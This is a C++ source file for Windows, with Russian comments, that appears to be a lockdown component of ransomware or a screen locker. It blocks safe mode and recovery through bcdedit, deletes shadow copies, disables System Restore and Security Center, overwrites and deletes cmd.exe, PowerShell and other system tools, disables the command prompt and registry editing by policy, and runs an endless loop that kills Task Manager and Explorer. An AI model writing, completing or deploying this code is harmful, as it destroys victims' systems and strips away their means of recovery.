#include <windows.h>
#include <tlhelp32.h>      // <--- ДОБАВЛЕНО
#include <thread>          // <--- ДОБАВЛЕНО
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>

namespace fs = std::filesystem;

void BlockSafeMode() {
    // Отключаем безопасный режим через реестр
    system("bcdedit /set {default} safeboot minimal");
    system("bcdedit /set {default} safeboot network");
    system("bcdedit /deletevalue {default} safeboot");
    system("bcdedit /set {current} recoveryenabled no");
    system("bcdedit /set {current} bootstatuspolicy ignoreallfailures");
    
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\SafeBoot",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegDeleteKeyA(hKey, "Minimal");
        RegDeleteKeyA(hKey, "Network");
        RegDeleteKeyA(hKey, "AlternateShell");
        RegCloseKey(hKey);
    }
    
    system("sc config wscsvc start= disabled");
    system("sc stop wscsvc");
    system("bcdedit /set {default} bootmenupolicy legacy");
    system("bcdedit /set {default} displaybootmenu no");
    system("vssadmin delete shadows /all /quiet");
    system("wmic shadowcopy delete");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f");
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableConfig /t REG_DWORD /d 1 /f");
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f");
}

void DeleteCmdExe() {
    try {
        std::vector<std::string> cmdPaths = {
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\SysWOW64\\cmd.exe",
            "C:\\Windows\\System32\\dism.exe",
            "C:\\Windows\\System32\\wbem\\wmic.exe",
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe"
        };
        
        for (const auto& path : cmdPaths) {
            if (fs::exists(path)) {
                for (int i = 0; i < 5; i++) {
                    std::ofstream out(path, std::ios::binary);
                    if (out) {
                        for (int j = 0; j < 1024; j++) {
                            out.put(static_cast<char>(0x00));
                        }
                        out.close();
                    }
                }
                fs::remove(path);
            }
        }
        
        system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableCMD /t REG_DWORD /d 2 /f");
        system("reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableCMD /t REG_DWORD /d 2 /f");
        system("reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\System\" /v DisableRegistryTools /t REG_DWORD /d 1 /f");
        system("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows\\System\" /v DisableRegistryTools /t REG_DWORD /d 1 /f");
    } catch (...) {}
}

void KillTaskManagerAndExplorer() {
    std::vector<std::string> killList = {
        "taskmgr.exe",
        "cmd.exe",
        "powershell.exe",
        "powercfg.exe",
        "regedit.exe",
        "gpedit.msc",
        "msconfig.exe",
        "control.exe",
        "explorer.exe"
    };
    
    while (true) {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(snapshot, &pe)) {
                do {
                    for (const auto& target : killList) {
                        if (_stricmp(pe.szExeFile, target.c_str()) == 0) {
                            HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                            if (process) {
                                TerminateProcess(process, 0);
                                CloseHandle(process);
                            }
                            break;
                        }
                    }
                } while (Process32Next(snapshot, &pe));
            }
            CloseHandle(snapshot);
        }
        
        system("taskkill /f /im explorer.exe");
        system("taskkill /f /im taskmgr.exe");
        system("taskkill /f /im cmd.exe");
        system("taskkill /f /im powershell.exe");
        
        Sleep(1000);
    }
}

void InitializeLockdownModule() {
    std::thread safeModeThread(BlockSafeMode);
    safeModeThread.detach();
    
    std::thread cmdThread(DeleteCmdExe);
    cmdThread.detach();
    
    std::thread killThread(KillTaskManagerAndExplorer);
    killThread.detach();
    
    system("bcdedit /set {default} bootmenupolicy legacy");
    system("bcdedit /set {default} displaybootmenu no");
    system("bcdedit /set {default} advancedoptions no");
    system("bcdedit /set {default} recoveryenabled no");
    system("bcdedit /set {default} badmemoryaccess no");
}
